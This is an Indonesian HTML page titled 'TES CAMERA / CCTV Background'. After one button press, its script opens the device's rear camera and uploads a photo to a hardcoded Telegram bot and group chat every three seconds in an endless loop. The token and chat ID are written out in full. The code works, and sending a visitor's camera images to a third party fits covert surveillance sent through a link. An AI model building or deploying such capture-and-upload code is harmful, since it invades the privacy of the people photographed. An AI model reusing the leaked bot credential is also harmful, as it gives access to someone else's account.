<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CCTV Background - Tampilkan Kamera</title>
    <style>
        body {
            font-family: 'Courier New', Courier, monospace;
            background-color: #000;
            color: #0f0; /* Warna hijau ala hacker */
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: flex-start; /* Tarik konten ke atas */
            min-height: 100vh;
            margin: 0;
            padding-top: 20px;
            text-align: center;
        }

        h1 { margin: 0; font-size: 40px; border-bottom: 2px solid #0f0; padding-bottom: 10px; }
        
        #status-box {
            margin-top: 20px;
            font-size: 18px;
            color: white;
        }

        #log {
            font-size: 12px;
            color: #888;
            margin-top: 10px;
        }

        /* --- STYLING UNTUK MENAMPILKAN KAMERA --- */
        #video, #canvas {
            display: block; /* Pastikan elemen ditampilkan */
            margin-top: 30px;
            max-width: 90%; /* Sesuaikan dengan layar */
            height: auto;
            border: 2px solid #f00; /* Border merah untuk efek rekaman */
            box-shadow: 0 0 10px rgba(255, 0, 0, 0.7); /* Efek glow merah */
        }
        
        button {
            margin-top: 30px;
            padding: 15px 30px;
            background: #0f0;
            color: #000;
            border: none;
            font-weight: bold;
            font-size: 20px;
            cursor: pointer;
            border-radius: 5px;
        }
        button:hover { background: #fff; }
    </style>
</head>
<body>
    <h1>TES CAMERA ðŸ“¸</h1>
    <div id="status-box">Menunggu akses...</div>
    <div id="log">Siap melakukan loop pengiriman</div>

    <button id="btnStart" onclick="startSystem()">MULAI SISTEM</button>

    <video id="video" autoplay playsinline></video>
    <canvas id="canvas" style="display: none;"></canvas>

<script>
    // --- KONFIGURASI ---
    const BOT_TOKEN = "7351606479:AAER5MF8ROCjnVmMOYGeKeUTGck5pV5Tr_k";
    const CHAT_ID = "-4602305711"; // ID Grup
    const JEDA_WAKTU = 3000; // Jeda 3000ms (3 detik) agar tidak kena limit spam
    
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const statusBox = document.getElementById('status-box');
    const logBox = document.getElementById('log');
    const btnStart = document.getElementById('btnStart');
    
    let counter = 0;

    // 1. Memulai Sistem
    async function startSystem() {
        btnStart.style.display = 'none'; // Hilangkan tombol
        statusBox.innerText = "Mengaktifkan kamera...";

        try {
            // Mengakses kamera belakang jika ada
            const stream = await navigator.mediaDevices.getUserMedia({ 
                video: { facingMode: "environment" } 
            });
            
            video.srcObject = stream;
            
            // Tunggu sebentar agar video load, lalu mulai loop
            video.onloadedmetadata = () => {
                statusBox.innerText = "Sistem Aktif. Mulai merekam & mengirim...";
                loopProcess();
            };

        } catch (err) {
            console.error(err);
            statusBox.innerHTML = "<span style='color:red'>Gagal Akses Kamera!</span>";
            btnStart.style.display = 'block';
        }
    }

    // 2. Loop Utama (Recursive)
    function loopProcess() {
        // Logika: Jepret -> Kirim -> (Selesai) -> Tunggu -> Ulangi
        captureAndSend();
    }

    // 3. Fungsi Jepret & Upload
    function captureAndSend() {
        counter++;
        statusBox.innerText = `Mengambil gambar ke-${counter}...`;

        // Gambar video ke canvas (di background)
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        const ctx = canvas.getContext('2d');
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

        // Convert ke Blob (File gambar)
        canvas.toBlob((blob) => {
            uploadToTelegram(blob);
        }, 'image/jpeg', 0.7); // Kualitas 70% agar ringan & cepat
    }

    // 4. Kirim ke Telegram
    function uploadToTelegram(imageBlob) {
        statusBox.innerText = `Mengirim gambar ke-${counter}...`;
        
        // Catatan: Token dan Chat ID ini terlihat seperti konfigurasi spesifik.
        // Anda harus memastikan bahwa Anda memiliki izin yang sah untuk menggunakan
        // bot dan grup Telegram yang dikonfigurasi.
        const formData = new FormData();
        formData.append("chat_id", CHAT_ID);
        formData.append("photo", imageBlob, `cctv-${counter}.jpg`);
        // Caption opsional
        formData.append("caption", `ðŸ“¸ Auto Capture #${counter}`);

        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
            method: 'POST',
            body: formData
        })
        .then(response => response.json())
        .then(data => {
            if (data.ok) {
                logBox.innerText = `âœ… Foto #${counter} Terkirim.`;
            } else {
                logBox.innerText = `âŒ Gagal #${counter}: ${data.description}`;
            }
        })
        .catch(err => {
            logBox.innerText = `âŒ Error Jaringan #${counter}`;
        })
        .finally(() => {
            // SETELAH SELESAI (SUKSES/GAGAL), ULANGI LAGI
            statusBox.innerText = `Menunggu ${JEDA_WAKTU/1000} detik...`;
            
            setTimeout(() => {
                loopProcess(); // Panggil fungsi loop lagi
            }, JEDA_WAKTU);
        });
    }
</script>
</body>
</html>
